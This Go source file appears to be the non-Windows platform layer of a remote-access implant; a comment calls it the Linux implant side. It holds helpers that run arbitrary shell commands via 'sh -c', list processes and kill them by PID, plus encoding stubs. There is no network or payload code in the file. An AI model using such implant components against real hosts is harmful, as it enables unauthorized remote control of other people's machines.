//go:build !windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func getUsername() string {
	// 兜底链见 username.go：USER/LOGNAME/SUDO_USER → uid + /etc/passwd → uid:<n> → unknown。
	// 旧实现只看 USER/USERNAME，服务/容器等无登录环境的 Linux 会话会一律显示 unknown。
	return getUsernameUnix(os.Getuid(), os.Getenv)
}

func getDefaultDir() string {
	return os.Getenv("HOME")
}

func getSysProcAttr() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{
		Setpgid: true,
		Pgid:    0,
	}
}

// sysBin 在非 Windows 平台原样返回程序名（供跨平台代码引用，Windows 上为绝对路径）。
func sysBin(name string) string {
	return name
}

// sysPowershell 在非 Windows 平台原样返回程序名。
// main.go 中调用点受 runtime.GOOS == "windows" 保护，实际不会执行，
// 但为保证 Linux 植入端编译期符号解析通过，需提供占位实现。
func sysPowershell() string {
	return "powershell.exe"
}

func executeCommand(command string, args []string) (string, int32, string) {
	var cmd *exec.Cmd

	if len(args) > 0 {
		cmd = exec.Command(command, args...)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	cmd.Dir = os.Getenv("HOME")

	out, err := cmd.CombinedOutput()
	if err != nil {
		code := int32(-1)
		if ee, ok := err.(*exec.ExitError); ok {
			code = int32(ee.ExitCode())
		}
		errMsg := err.Error()
		if len(out) > 0 {
			errMsg = errMsg + ": " + string(out)
		}
		return string(out), code, errMsg
	}
	return string(out), 0, ""
}

func listProcesses() (string, int32, string) {
	out, err := exec.Command("sh", "-c", "ps -eo pid,comm --no-headers").CombinedOutput()
	if err != nil {
		return "", -1, err.Error()
	}

	var result strings.Builder
	result.WriteString("PID      Name\n")
	result.WriteString("---      ----\n")

	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		if line == "" {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) >= 2 {
			result.WriteString(fmt.Sprintf("%-8s %s\n", fields[0], fields[1]))
		}
	}

	return result.String(), 0, ""
}

func killProcess(pid uint32) (string, int32, string) {
	out, err := exec.Command("kill", "-9", fmt.Sprintf("%d", pid)).CombinedOutput()
	if err != nil {
		return string(out), -1, err.Error()
	}
	return string(out), 0, ""
}

// gbkToUTF8 / utf8ToGBK：非 Windows 平台无 GBK 概念，原样返回（跨平台编译占位）。
// main.go 中的调用点均受 runtime.GOOS == "windows" 保护，实际不会执行。
func gbkToUTF8(data []byte) []byte { return data }

func utf8ToGBK(data []byte) []byte { return data }

// decodeConsoleText：非 Windows 平台输出本来就是 UTF-8（/bin/sh 的 locale 通常 UTF-8），
// 原样返回。语义与 Windows 版一致（Windows 版只对非 UTF-8 的行做 GBK→UTF-8）。
func decodeConsoleText(s string) string { return s }
